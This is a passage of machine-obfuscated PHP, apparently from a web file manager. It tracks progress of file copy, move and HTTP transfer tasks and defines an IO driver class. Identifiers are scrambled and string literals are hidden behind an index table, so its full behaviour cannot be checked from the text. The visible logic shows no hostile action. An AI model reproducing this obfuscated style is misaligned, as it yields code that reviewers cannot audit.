Hook::unbind($„Ä–Áİˆ[1717], array($this, $„Ä–Áİˆ[1718])); } public function copyMoveStart($ÓÜÀ·‡§, $ñ¦‚—êş, $ü“‚Ù–ì, $Ü‹é­å”) { $Ã—œİÆ =& $_SERVER[Ì¥ŞÒ°£]; self::log($Ã—œİÆ[1728] . $ñ¦‚—êş . $Ã—œİÆ[70] . $Ü‹é­å”); $Ûø±ü– = rtrim(TEMP_FILES, $Ã—œİÆ[8]); if (substr($ñ¦‚—êş, 0, strlen($Ûø±ü–)) == $Ûø±ü–) { return; } if (substr($Ü‹é­å”, 0, strlen($Ûø±ü–)) == $Ûø±ü–) { return; } $¸±¶ğª =& $this->task; $¸±¶ğª[$Ã—œİÆ[1729]] = KodIO::transferType($ÓÜÀ·‡§, $ü“‚Ù–ì); $this->update(); } public function updateAfter() { $‰ÍÉ¸· =& $_SERVER[Ì¥ŞÒ°£]; $’Îø°‹­ =& $this->task; if (!$’Îø°‹­[$‰ÍÉ¸·[765]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($’Îø°‹­[$‰ÍÉ¸·[1729]] == $‰ÍÉ¸·[1318]) { return; } self::updateTask($’Îø°‹­); } private static function updateTask(&$î±ÅïÜ¼) { $ºÒÍñü¬ =& $_SERVER[Ì¥ŞÒ°£]; if ($î±ÅïÜ¼[$ºÒÍñü¬[1729]] == $ºÒÍñü¬[1200] || $î±ÅïÜ¼[$ºÒÍñü¬[1729]] == $ºÒÍñü¬[107]) { if ($î±ÅïÜ¼[$ºÒÍñü¬[1723]]) { $î±ÅïÜ¼[$ºÒÍñü¬[1726]] = $î±ÅïÜ¼[$ºÒÍñü¬[1725]] + $î±ÅïÜ¼[$ºÒÍñü¬[1722]]; } } else { if ($î±ÅïÜ¼[$ºÒÍñü¬[1729]] == $ºÒÍñü¬[1319]) { if ($î±ÅïÜ¼[$ºÒÍñü¬[1723]] == $ºÒÍñü¬[1200]) { $î±ÅïÜ¼[$ºÒÍñü¬[1726]] = $î±ÅïÜ¼[$ºÒÍñü¬[1725]] + $î±ÅïÜ¼[$ºÒÍñü¬[1722]] * 0.5; } else { if ($î±ÅïÜ¼[$ºÒÍñü¬[1723]] == $ºÒÍñü¬[107]) { $î±ÅïÜ¼[$ºÒÍñü¬[1726]] = $î±ÅïÜ¼[$ºÒÍñü¬[1725]] + $î±ÅïÜ¼[$ºÒÍñü¬[1721]] * 0.5 + $î±ÅïÜ¼[$ºÒÍñü¬[1722]] * 0.5; } } } } $î±ÅïÜ¼[$ºÒÍñü¬[1669]] = $î±ÅïÜ¼[$ºÒÍñü¬[1726]] / $î±ÅïÜ¼[$ºÒÍñü¬[765]]; if ($î±ÅïÜ¼[$ºÒÍñü¬[1669]] > 0) { $ùı‡ö£¢ = timeFloat() - $î±ÅïÜ¼[$ºÒÍñü¬[1671]] - $î±ÅïÜ¼[$ºÒÍñü¬[1674]]; $î±ÅïÜ¼[$ºÒÍñü¬[1675]] = $ùı‡ö£¢ * (1 - $î±ÅïÜ¼[$ºÒÍñü¬[1669]]) / $î±ÅïÜ¼[$ºÒÍñü¬[1669]]; } } public function addPath($çßÆ¿Úê) { $æ¬÷œ„ø =& $_SERVER[Ì¥ŞÒ°£]; if (!$çßÆ¿Úê) { return; } $¬Ì¨úí– =& $this->task; $óÎº©€Ü = IO::infoWithChildren($çßÆ¿Úê); $ä¿â‘’ô = $¬Ì¨úí–[$æ¬÷œ„ø[1730]] ? $¬Ì¨úí–[$æ¬÷œ„ø[1730]][$æ¬÷œ„ø[1731]] : 0; $¬Ì¨úí–[$æ¬÷œ„ø[1730]] = array($æ¬÷œ„ø[1731] => $ä¿â‘’ô + 1, $æ¬÷œ„ø[420] => $óÎº©€Ü[$æ¬÷œ„ø[32]], $æ¬÷œ„ø[84] => $óÎº©€Ü[$æ¬÷œ„ø[84]], $æ¬÷œ„ø[519] => $óÎº©€Ü[$æ¬÷œ„ø[519]] ? $óÎº©€Ü[$æ¬÷œ„ø[519]] : $óÎº©€Ü[$æ¬÷œ„ø[84]]); if ($óÎº©€Ü[$æ¬÷œ„ø[33]] == $æ¬÷œ„ø[199]) { $¬Ì¨úí–[$æ¬÷œ„ø[788]] += 1; } else { $¬Ì¨úí–[$æ¬÷œ„ø[788]] += $óÎº©€Ü[$æ¬÷œ„ø[79]][$æ¬÷œ„ø[77]]; if ($óÎº©€Ü[$æ¬÷œ„ø[402]]) { $¬Ì¨úí–[$æ¬÷œ„ø[788]] += $óÎº©€Ü[$æ¬÷œ„ø[79]][$æ¬÷œ„ø[78]] + 1; } } $¬Ì¨úí–[$æ¬÷œ„ø[765]] += $óÎº©€Ü[$æ¬÷œ„ø[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($…Ç„ã´“) { } public function sourceAddHashEnd($¨¢ŸïòÅ) { } public function sourceAddFileStart($­Ó¥Ş›­) { $Šè©ª» =& $_SERVER[Ì¥ŞÒ°£]; $ÍğúöÍÙ =& $this->task; $ÍğúöÍÙ[$Šè©ª»[1721]] = $­Ó¥Ş›­[$Šè©ª»[76]]; $ÍğúöÍÙ[$Šè©ª»[1719]] = $­Ó¥Ş›­[$Šè©ª»[32]]; $ÍğúöÍÙ[$Šè©ª»[1069]] = $­Ó¥Ş›­[$Šè©ª»[32]]; $ÍğúöÍÙ[$Šè©ª»[1732]] = $­Ó¥Ş›­[$Šè©ª»[84]]; $this->update(); } public function sourceAddFileEnd($ùÂ¯–ô¿) { $âœÏ¯·ß =& $_SERVER[Ì¥ŞÒ°£]; $åƒøè¾à =& $this->task; $åƒøè¾à[$âœÏ¯·ß[1726]] += $ùÂ¯–ô¿[$âœÏ¯·ß[76]]; $åƒøè¾à[$âœÏ¯·ß[1732]] = $ùÂ¯–ô¿[$âœÏ¯·ß[84]]; $this->update(1); } public function copyFileStart($¸¡—«Áµ, $¹ıÂÖèŞ, $ËÜ¢˜ŠÙ, $´ä…©¸æ, $Šğ×‰ıŞ, $ÔšÅÓÎç) { $úÂÇñË¡ =& $_SERVER[Ì¥ŞÒ°£]; $ñõÒÅÎÀ = $Šğ×‰ıŞ; if ($ñõÒÅÎÀ == $GLOBALS[$úÂÇñË¡[1733]]) { $ñõÒÅÎÀ = $GLOBALS[$úÂÇñË¡[1734]]; } $GLOBALS[$úÂÇñË¡[1734]] = $Šğ×‰ıŞ; $GLOBALS[$úÂÇñË¡[1733]] = $ÔšÅÓÎç; $¹‰ÚéÀ  =& $this->task; $¹‰ÚéÀ [$úÂÇñË¡[1719]] = $ñõÒÅÎÀ; $¹‰ÚéÀ [$úÂÇñË¡[1721]] = (int) $¸¡—«Áµ->size($¹ıÂÖèŞ); $¹‰ÚéÀ [$úÂÇñË¡[1722]] = 0; $¹‰ÚéÀ [$úÂÇñË¡[1069]] = $úÂÇñË¡[12]; $¹‰ÚéÀ [$úÂÇñË¡[1723]] = $úÂÇñË¡[12]; $¹‰ÚéÀ [$úÂÇñË¡[1724]] = 0; $¯ÜäÑ¶¤ = $¹‰ÚéÀ [$úÂÇñË¡[1721]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¹‰ÚéÀ [$úÂÇñË¡[399]] . $úÂÇñË¡[1735]); if ($¯ÜäÑ¶¤ && file_exists(get_path_father($´ä…©¸æ))) { Cache::set($¹‰ÚéÀ [$úÂÇñË¡[399]] . $úÂÇñË¡[1735], $´ä…©¸æ); $¹‰ÚéÀ [$úÂÇñË¡[1692]] = array($úÂÇñË¡[1736], $úÂÇñË¡[1737]); } $this->update(0, $¯ÜäÑ¶¤); } public static function updateCopyLocalFileSize($úÜŞÕÉ¯) { $½Æåş¯· =& $_SERVER[Ì¥ŞÒ°£]; $ÅÉï©ş = Cache::get($úÜŞÕÉ¯[$½Æåş¯·[399]] . $½Æåş¯·[1735]); if (!$ÅÉï©ş || !file_exists($ÅÉï©ş)) { return $úÜŞÕÉ¯; } $úÜŞÕÉ¯[$½Æåş¯·[1722]] = @filesize($ÅÉï©ş); $úÜŞÕÉ¯[$½Æåş¯·[1726]] += $úÜŞÕÉ¯[$½Æåş¯·[1722]]; self::updateTask($úÜŞÕÉ¯); return $úÜŞÕÉ¯; } public function copyFileEnd($×½¿üÏÜ, $¡üóŸ¡¯, $£§ûˆÈÚ, $ä²ÏÇİÃ, $Ã‘Ñûß, $¡òªÖÌ) { $’»Ñˆ¥Ÿ =& $_SERVER[Ì¥ŞÒ°£]; $Ç°öŠÎÈ =& $this->task; $Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1722]] = $Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1721]]; $Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1723]] = $’»Ñˆ¥Ÿ[12]; unset($Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1692]]); if ($Ã‘Ñûß == $Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1719]]) { $Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1725]] += $Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1721]]; $Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1726]] = $Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1725]]; $õµù—Ú² = 1; if (isset($Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1732]]) && $Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1732]] == $¡üóŸ¡¯) { $õµù—Ú² = 0; } $this->update($õµù—Ú²); } else { $this->update(); $Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1722]] = 0; } Cache::remove($Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[399]] . $’»Ñˆ¥Ÿ[1735]); self::log($’»Ñˆ¥Ÿ[1738] . $¡üóŸ¡¯ . $’»Ñˆ¥Ÿ[70] . $ä²ÏÇİÃ . $’»Ñˆ¥Ÿ[231] . $Ã‘Ñûß . $’»Ñˆ¥Ÿ[1739] . $Ç°öŠÎÈ[$’»Ñˆ¥Ÿ[1719]]); } public function updateFileEnd($ÂÒ¬¶™¹, $îÆÔ÷ìŒ) { $Ğıı¼ùà =& $_SERVER[Ì¥ŞÒ°£]; $§îÌÛÕ =& $this->task; $§îÌÛÕ[$Ğıı¼ùà[1719]] = $ÂÒ¬¶™¹; $§îÌÛÕ[$Ğıı¼ùà[1721]] = $îÆÔ÷ìŒ; $§îÌÛÕ[$Ğıı¼ùà[1725]] += $îÆÔ÷ìŒ; $§îÌÛÕ[$Ğıı¼ùà[1726]] = $§îÌÛÕ[$Ğıı¼ùà[1725]]; $this->update(1); self::log($Ğıı¼ùà[1740] . $ÂÒ¬¶™¹); } public function sourceModelCopy($áÏÔ›”) { $£ª¸ÇÁğ =& $_SERVER[Ì¥ŞÒ°£]; $Œº¬ÙÉô = $áÏÔ›”[0]; $€ú¦«Ø = $áÏÔ›”[1]; $œ™Ù“»½ =& $this->task; $this->sourceModelCopyFlag = !0; $„í¥íø = 0; switch ($Œº¬ÙÉô) { case $£ª¸ÇÁğ[572]: $„í¥íø = 1; break; case $£ª¸ÇÁğ[575]: $œ™Ù“»½[$£ª¸ÇÁğ[1719]] = $€ú¦«Ø[$£ª¸ÇÁğ[32]]; break; case $£ª¸ÇÁğ[577]: $„í¥íø = intval($áÏÔ›”[$£ª¸ÇÁğ[380]] * 0.4); break; case $£ª¸ÇÁğ[579]: $„í¥íø = intval($áÏÔ›”[$£ª¸ÇÁğ[380]] * 0.2); break; case $£ª¸ÇÁğ[581]: $„í¥íø = intval($áÏÔ›”[$£ª¸ÇÁğ[380]] * 0.4); break; } $this->update($„í¥íø); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Å¼°ï…ä, $¿—Æ’Ğ…) { $…‡²Óêó =& $_SERVER[Ì¥ŞÒ°£]; $this->sourceModelCopyFlag = !0; $¨ŒÔÜÃ = 1; if (isset($Å¼°ï…ä[$…‡²Óêó[79]])) { $¨ŒÔÜÃ = $Å¼°ï…ä[$…‡²Óêó[79]][$…‡²Óêó[77]]; $¨ŒÔÜÃ = $¨ŒÔÜÃ + $Å¼°ï…ä[$…‡²Óêó[79]][$…‡²Óêó[78]] + 1; } $this->update($¨ŒÔÜÃ); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÅÌî Šú) { $this->sourceRemove($ÅÌî Šú, !1); } public function curlProgress($àÇæ§, $îæèúŒ, $ã›“¸ã, $Šêäİ†, $³øûÚ˜) { $ÃÔ•µÓ› =& $_SERVER[Ì¥ŞÒ°£]; $““ŠïŒï =& $this->task; if ($³øûÚ˜ > 0) { $““ŠïŒï[$ÃÔ•µÓ›[1069]] = $ÃÔ•µÓ›[1741]; $““ŠïŒï[$ÃÔ•µÓ›[1723]] = $ÃÔ•µÓ›[107]; if ($““ŠïŒï[$ÃÔ•µÓ›[1721]]) { $““ŠïŒï[$ÃÔ•µÓ›[1722]] = $³øûÚ˜; } if ($““ŠïŒï[$ÃÔ•µÓ›[1724]]) { $““ŠïŒï[$ÃÔ•µÓ›[1722]] = $³øûÚ˜ + $““ŠïŒï[$ÃÔ•µÓ›[1724]]; } } else { if ($ã›“¸ã > 0) { if ($““ŠïŒï[$ÃÔ•µÓ›[1721]] == $îæèúŒ) { $““ŠïŒï[$ÃÔ•µÓ›[1722]] = $ã›“¸ã; $““ŠïŒï[$ÃÔ•µÓ›[1069]] = $ÃÔ•µÓ›[1742]; $““ŠïŒï[$ÃÔ•µÓ›[1723]] = $ÃÔ•µÓ›[1200]; } } } $this->update(); } public function curlProgressStart($ï•ªÍÈÂ) { } public function curlProgressEnd($äÕŠÏå) { $›Òëêºˆ =& $_SERVER[Ì¥ŞÒ°£]; $¤ÍÜô»¦ =& $this->task; $¥Œ“¶ï¿ = curl_getinfo($äÕŠÏå); $ÂèŒê›º = $¥Œ“¶ï¿[$›Òëêºˆ[1743]]; if ($ÂèŒê›º == -1) { $ÂèŒê›º = $¥Œ“¶ï¿[$›Òëêºˆ[1744]]; } if ($¤ÍÜô»¦[$›Òëêºˆ[1723]] == $›Òëêºˆ[107] && $ÂèŒê›º) { $¤ÍÜô»¦[$›Òëêºˆ[1724]] += $ÂèŒê›º; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÉçÑµ =& $_SERVER[Ì¥ŞÒ°£]; $úì ´İÖ =& $this->task; $úì ´İÖ[$ÉçÑµ[1745]] = 1; Hook::bind($ÉçÑµ[1713], array($this, $ÉçÑµ[1746])); Hook::bind($ÉçÑµ[1715], array($this, $ÉçÑµ[1747])); Hook::bind($ÉçÑµ[1717], array($this, $ÉçÑµ[1748])); } protected function endAfter() { $Ä¡ö´ =& $_SERVER[Ì¥ŞÒ°£]; Hook::unbind($Ä¡ö´[1713], array($this, $Ä¡ö´[1746])); Hook::unbind($Ä¡ö´[1715], array($this, $Ä¡ö´[1747])); Hook::unbind($Ä¡ö´[1717], array($this, $Ä¡ö´[1748])); } public function progressStart($ØĞùÀ‚û) { $¿¹ÄÖ¹Ä =& $_SERVER[Ì¥ŞÒ°£]; $ª²Ûöá‹ = curl_getinfo($ØĞùÀ‚û); self::log($¿¹ÄÖ¹Ä[1749] . $ª²Ûöá‹[$¿¹ÄÖ¹Ä[307]]); self::valueSet($this->task[$¿¹ÄÖ¹Ä[399]], $this->task); } public function progressEnd($ã¢×†å¯) { $¹›£ƒ€‹ =& $_SERVER[Ì¥ŞÒ°£]; self::log($¹›£ƒ€‹[1750] . $this->task[$¹›£ƒ€‹[399]]); $this->end(); } public function progress($üºé¡ç, $ù´™š‹º, $ŸŞ´ÅÂ, $£È¯ôÜş, $íİ©ë©) { $äß¡÷ÊÏ =& $_SERVER[Ì¥ŞÒ°£]; $ï¶ú§âæ =& $this->task; if ($íİ©ë© > 0) { $ï¶ú§âæ[$äß¡÷ÊÏ[788]] = $ï¶ú§âæ[$äß¡÷ÊÏ[788]] == 0 ? $£È¯ôÜş : $ï¶ú§âæ[$äß¡÷ÊÏ[788]]; $ï¶ú§âæ[$äß¡÷ÊÏ[1668]] = $íİ©ë©; } else { if ($ŸŞ´ÅÂ > 0) { $ï¶ú§âæ[$äß¡÷ÊÏ[788]] = $ï¶ú§âæ[$äß¡÷ÊÏ[788]] == 0 ? $ù´™š‹º : $ï¶ú§âæ[$äß¡÷ÊÏ[788]]; $ï¶ú§âæ[$äß¡÷ÊÏ[1668]] = $ŸŞ´ÅÂ; } } $this->update(); self::log("\x70\162\x6f\147\162\x65\163\163\x48\x74\x74\160\72\x64\x6f\x77\x6e\x3a{$ŸŞ´ÅÂ}\x2f{$ù´™š‹º}\x3b\40\165\160\x6c\157\x61\x64\x3a{$íİ©ë©}\x2f{$£È¯ôÜş}\x3b"); } } goto EåÍŞ†ê; C‹§ÆåéÉ¶: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¢ïÄÇ·, $’Ô«…üû) { $÷•ÑØÇİ =& $_SERVER[Ì¥ŞÒ°£]; $‚¼¸ËÔ = $’Ô«…üû; $GLOBALS[$÷•ÑØÇİ[1151]] = $÷•ÑØÇİ[1152] . $¢ïÄÇ·; Hook::trigger($÷•ÑØÇİ[1152] . $¢ïÄÇ· . $÷•ÑØÇİ[1153], $‚¼¸ËÔ); $²¼Œâˆ„ = self::driverMake($’Ô«…üû[0]); if (!$²¼Œâˆ„) { return !1; } if (method_exists($²¼Œâˆ„, $¢ïÄÇ·)) { $¨­İÉŒæ = @call_user_func_array(array($²¼Œâˆ„, $¢ïÄÇ·), $’Ô«…üû); } else { if (method_exists($²¼Œâˆ„, $÷•ÑØÇİ[1154])) { $¨­İÉŒæ = @call_user_func_array(array($²¼Œâˆ„, $¢ïÄÇ·), $’Ô«…üû); } else { if (method_exists(self, $¢ïÄÇ·)) { $¨­İÉŒæ = @call_user_func_array(array(self, $¢ïÄÇ·), $’Ô«…üû); } else { $¨­İÉŒæ = call_user_func_array(array(parent, $¢ïÄÇ·), $’Ô«…üû); } } } Hook::trigger($÷•ÑØÇİ[1152] . $¢ïÄÇ· . $÷•ÑØÇİ[1155], $‚¼¸ËÔ, $¨­İÉŒæ); return $¨­İÉŒæ; } public static function init($¢¬ñş±†) { return self::driverMake($¢¬ñş±†); } public static function copy($×ƒ’³‘Ã, $€Öß§’Ü, $Å²Â¼ãº = false, $¡š‡Õ½ = false) { return self::copyMoveStart($×ƒ’³‘Ã, $€Öß§’Ü, $Å²Â¼ãº, $_SERVER[Ì¥ŞÒ°£][555], $¡š‡Õ½); } public static function move($êçŞÑ‹‘, $Ì°“¥Êê, $öœœ³¹ = false, $½ü½Šæš = false) { return self::copyMoveStart($êçŞÑ‹‘, $Ì°“¥Êê, $öœœ³¹, $_SERVER[Ì¥ŞÒ°£][557], $½ü½Šæš); } private static function copyMoveStart($®âß’´Ì, $ıÔÛ—²ò, $¸Ì³ÏŠâ, $Áù¦ëéÕ, $€ºä´¬ø) { $±Ä¶§ŞÌ =& $_SERVER[Ì¥ŞÒ°£]; $œäˆ¼ä = array($®âß’´Ì, $ıÔÛ—²ò, $¸Ì³ÏŠâ, $€ºä´¬ø); Hook::trigger($±Ä¶§ŞÌ[1152] . $Áù¦ëéÕ . $±Ä¶§ŞÌ[1153], $œäˆ¼ä); $ÈçòäÃ = self::copyMove($®âß’´Ì, $ıÔÛ—²ò, $¸Ì³ÏŠâ, $Áù¦ëéÕ, $€ºä´¬ø); Hook::trigger($±Ä¶§ŞÌ[1152] . $Áù¦ëéÕ . $±Ä¶§ŞÌ[1155], $œäˆ¼ä, $ÈçòäÃ); return $ÈçòäÃ; } public static function saveFile($Ä°àİ«™, $’ì‰÷“, $õ‡é£¨± = true) { $ßçèØ»ı =& $_SERVER[Ì¥ŞÒ°£]; $Ó§ûÓï¿ = self::info($’ì‰÷“); $Àºñ¼Â× = self::driverMake($Ä°àİ«™); $Ú‹Òˆ£õ = self::driverMake($’ì‰÷“); $è¶ØŸ€ = !1; if ($Ú‹Òˆ£õ->pathParse[$ßçèØ»ı[1156]]) { $è¶ØŸ€ = $Ú‹Òˆ£õ; $˜…ò†ÖÛ = $Ú‹Òˆ£õ->pathParse[$ßçèØ»ı[1156]]; $Ú‹Òˆ£õ = self::driverMake($˜…ò†ÖÛ); } if ($Àºñ¼Â×->pathParse[$ßçèØ»ı[1156]]) { $™ó‘Ğûœ = $Àºñ¼Â×->pathParse[$ßçèØ»ı[1156]]; $Àºñ¼Â× = self::driverMake($™ó‘Ğûœ); } $“ÕşÍç… = $Ú‹Òˆ£õ->pathFather($’ì‰÷“); $Ï¯€“ÆÃ = !0; if (!$õ‡é£¨± && self::driverIsSame($Àºñ¼Â×, $Ú‹Òˆ£õ)) { $Ï¯€“ÆÃ = !1; } $èÜã ²ò = self::copyFile($Àºñ¼Â×, $Ä°àİ«™, $Ú‹Òˆ£õ, $“ÕşÍç…, $Ó§ûÓï¿[$ßçèØ»ı[32]], $Ï¯€“ÆÃ); if ($è¶ØŸ€) { $èÜã ²ò = $è¶ØŸ€->getPathOuter($èÜã ²ò); } return $èÜã ²ò; } private static function copyMove($òû„Á†ú, $³â¶½”, $Ç·¢çüğ, $éØÖ´ôË, $ŞØáº©û = false) { $€ÅÜ­¶ =& $_SERVER[Ì¥ŞÒ°£]; if (!$òû„Á†ú || $òû„Á†ú == $€ÅÜ­¶[8] || !$³â¶½”) { return !1; } ignore_timeout(); $Ä¢¦€Ò§ = self::driverMake($òû„Á†ú); $ÄÆœÀ‚Ç = self::driverMake($³â¶½”); $ìÈ‹®” = $éØÖ´ôË == $€ÅÜ­¶[557]; $¨˜Ùèòá = !1; if ($ÄÆœÀ‚Ç->pathParse[$€ÅÜ­¶[1156]]) { $¨˜Ùèòá = $ÄÆœÀ‚Ç; $³â¶½” = $ÄÆœÀ‚Ç->pathParse[$€ÅÜ­¶[1156]]; $ÄÆœÀ‚Ç = self::driverMake($³â¶½”); } if ($Ä¢¦€Ò§->pathParse[$€ÅÜ­¶[1156]]) { $òû„Á†ú = $Ä¢¦€Ò§->pathParse[$€ÅÜ­¶[1156]]; $Ä¢¦€Ò§ = self::driverMake($òû„Á†ú); } self::check($Ä¢¦€Ò§, $òû„Á†ú, $ÄÆœÀ‚Ç, $³â¶½”); Hook::trigger($€ÅÜ­¶[1157], $Ä¢¦€Ò§, $òû„Á†ú, $ÄÆœÀ‚Ç, $³â¶½”); $—Àú‡„Ë = self::driverIsSame($Ä¢¦€Ò§, $ÄÆœÀ‚Ç); if ($—Àú‡„Ë) { if ($éØÖ´ôË == $€ÅÜ­¶[557] && !method_exists($ÄÆœÀ‚Ç, $€ÅÜ­¶[1158]) && trim($³â¶½”, $€ÅÜ­¶[8]) == trim($ÄÆœÀ‚Ç->pathFather($òû„Á†ú), $€ÅÜ­¶[8])) { if ($Ä¢¦€Ò§->pathThis($òû„Á†ú) != $ŞØáº©û && !$Ä¢¦€Ò§->isTypeObject()) { return $Ä¢¦€Ò§->rename($òû„Á†ú, $ŞØáº©û); } return $ÄÆœÀ‚Ç->getPathOuter($òû„Á†ú); } if (method_exists($ÄÆœÀ‚Ç, $éØÖ´ôË)) { return $ÄÆœÀ‚Ç->{$éØÖ´ôË}($òû„Á†ú, $³â¶½”, $Ç·¢çüğ, $ŞØáº©û); } } if ($—Àú‡„Ë && $éØÖ´ôË == $€ÅÜ­¶[557] && $ÄÆœÀ‚Ç->getType() == $€ÅÜ­¶[106]) { $Ô¼ÃÅšá = $ÄÆœÀ‚Ç->movePath($òû„Á†ú, $³â¶½”, $ŞØáº©û); if ($Ô¼ÃÅšá) { return $Ô¼ÃÅšá; } } $®ìˆ¿å = $Ä¢¦€Ò§->isFile($òû„Á†ú); if (!$®ìˆ¿å && $ÄÆœÀ‚Ç->getType() == $€ÅÜ­¶[760] && $Ä¢¦€Ò§->getType() == $€ÅÜ­¶[106]) { $Ô¼ÃÅšá = $ÄÆœÀ‚Ç->copyFolderFromIO($Ä¢¦€Ò§, $òû„Á†ú, $³â¶½”, $Ç·¢çüğ, $ìÈ‹®”, $ŞØáº©û); } else { $Ô¼ÃÅšá = self::copyPath($Ä¢¦€Ò§, $òû„Á†ú, $ÄÆœÀ‚Ç, $³â¶½”, $Ç·¢çüğ, $ìÈ‹®”, $®ìˆ¿å, $ŞØáº©û); } if ($Ô¼ÃÅšá && $ìÈ‹®”) { $Ä¢¦€Ò§->remove($òû„Á†ú); } if ($¨˜Ùèòá) { $Ô¼ÃÅšá = $¨˜Ùèòá->getPathOuter($Ô¼ÃÅšá); } return $Ô¼ÃÅšá; } private static function check($ÖÃ¨Ğ, $á’ÀâÕ, $âÄé€óÖ, &$¶ïàª–¯) { $ãˆ­ôú¢ =& $_SERVER[Ì¥ŞÒ°£]; if (self::driverIsSame($ÖÃ¨Ğ, $âÄé€óÖ) && $ÖÃ¨Ğ->isFolder($á’ÀâÕ) && $ÖÃ¨Ğ->isParentOf($á’ÀâÕ, $¶ïàª–¯)) { show_json(LNG($ãˆ­ôú¢[1159]), !1); } if (!$ÖÃ¨Ğ->exist($á’ÀâÕ)) { show_json(LNG($ãˆ­ôú¢[105]), !1); } } private static function copyPath($šóå„àå, $¢Ÿõ˜Û, $ÍòÇÏ”, $£³ºÍå, $ëóËö¢È, $Ç£Ç¶¥í, $î³ì¤—Ò, $´ ×áĞ = false, $Á™ßÃğŸ = true) { $öìˆÂ£š =& $_SERVER[Ì¥ŞÒ°£]; $†›ïÄ» = empty($´ ×áĞ) && $´ ×áĞ !== $öìˆÂ£š[197] ? $šóå„àå->pathThis($¢Ÿõ˜Û) : $´ ×áĞ; if ($ëóËö¢È) { $ÕóÜ³™‘ = $ÍòÇÏ”->fileNameExist($£³ºÍå, $†›ïÄ»); $ ¹¿¶Éß = $†›ïÄ»; $†›ïÄ» = $ÍòÇÏ”->fileNameAuto($£³ºÍå, $†›ïÄ», $ëóËö¢È, !$î³ì¤—Ò); if (!$ÕóÜ³™‘ || $ ¹¿¶Éß != $†›ïÄ») { $ëóËö¢È = !1; } if ($Á™ßÃğŸ && !$ëóËö¢È) { $ÍòÇÏ”->_data[$öìˆÂ£š[1160]] = !0; } } if ($î³ì¤—Ò) { return self::copyFile($šóå„àå, $¢Ÿõ˜Û, $ÍòÇÏ”, $£³ºÍå, $†›ïÄ», $Ç£Ç¶¥í); } if ($ëóËö¢È == REPEAT_RENAME_FOLDER) { $ëóËö¢È = !1; } $Úñöİ¤³ = rtrim($£³ºÍå, $öìˆÂ£š[8]) . $öìˆÂ£š[8] . $†›ïÄ»; $Ã•÷§ı = $ÍòÇÏ”->mkdir($ÍòÇÏ”->getPath($Úñöİ¤³), $ëóËö¢È); $£³ºÍå = $ÍòÇÏ”->getPathInner($Ã•÷§ı); $ïÃîÉş = $šóå„àå->listPath($¢Ÿõ˜Û, !0); $ïÃîÉş = is_array($ïÃîÉş) ? $ïÃîÉş : array($öìˆÂ£š[83] => array(), $öìˆÂ£š[82] => array()); $ˆîÚÈñ– = array_merge($ïÃîÉş[$öìˆÂ£š[83]], $ïÃîÉş[$öìˆÂ£š[82]]); foreach ($ˆîÚÈñ– as $Ë‡Ã£‰) { $Ï‘ß˜“¼ = $Ë‡Ã£‰[$öìˆÂ£š[33]] == $öìˆÂ£š[199]; $¢Ÿõ˜Û = $šóå„àå->getPathInner($Ë‡Ã£‰[$öìˆÂ£š[84]]); $óÛ‰ÄÈƒ = self::copyPath($šóå„àå, $¢Ÿõ˜Û, $ÍòÇÏ”, $£³ºÍå, $ëóËö¢È, $Ç£Ç¶¥í, $Ï‘ß˜“¼, !1, !1); if (!$óÛ‰ÄÈƒ) { IO::errorTips($öìˆÂ£š[1161] . $¢Ÿõ˜Û . $öìˆÂ£š[70] . $£³ºÍå); } } self::copyMoveKeepInfo($šóå„àå, $¢Ÿõ˜Û, $Ã•÷§ı); return $Ã•÷§ı; } private static function copyFile($ï”‡ñ½Ï, $ÇÁ½Ê’³, $Ğ™§ãÏø, $ëÛŒ£á†, $ô­Ÿ¤µ, $Ğ€„¸Ï¯) { $ĞùÑÌàä =& $_SERVER[Ì¥ŞÒ°£]; $ëÛŒ£á† = $Ğ™§ãÏø->getPath(rtrim($ëÛŒ£á†, $ĞùÑÌàä[8]) . $ĞùÑÌàä[8] . $ô­Ÿ¤µ); $û©¦ËÔÌ = $ĞùÑÌàä[1162] . time() . rand_string(5); Hook::trigger($ĞùÑÌàä[1163], $ï”‡ñ½Ï, $ÇÁ½Ê’³, $Ğ™§ãÏø, $ëÛŒ£á†, $ô­Ÿ¤µ, $û©¦ËÔÌ); if (self::driverIsSame($ï”‡ñ½Ï, $Ğ™§ãÏø)) { if ($Ğ€„¸Ï¯) { $×¨ÌãÂÎ = $Ğ™§ãÏø->moveFile($ÇÁ½Ê’³, $ëÛŒ£á†); } else { $×¨ÌãÂÎ = $Ğ™§ãÏø->copyFile($ÇÁ½Ê’³, $ëÛŒ£á†); } Hook::trigger($ĞùÑÌàä[1164], $ï”‡ñ½Ï, $ÇÁ½Ê’³, $Ğ™§ãÏø, $ëÛŒ£á†, $ô­Ÿ¤µ, $×¨ÌãÂÎ); self::copyMoveKeepInfo($ï”‡ñ½Ï, $ÇÁ½Ê’³, $×¨ÌãÂÎ); return $×¨ÌãÂÎ; } $ï³‘¦‘Ù = TEMP_FILES; if ($GLOBALS[$ĞùÑÌàä[6]][$ĞùÑÌàä[89]][$ĞùÑÌàä[798]]) { $ï³‘¦‘Ù = $GLOBALS[$ĞùÑÌàä[6]][$ĞùÑÌàä[89]][$ĞùÑÌàä[798]]; } $ô•ù¿º½ = $ï³‘¦‘Ù; mk_dir($ô•ù¿º½); $ˆËÛÎæ© = $ô•ù¿º½ . $û©¦ËÔÌ; $©ö…ª = $ˆËÛÎæ©; 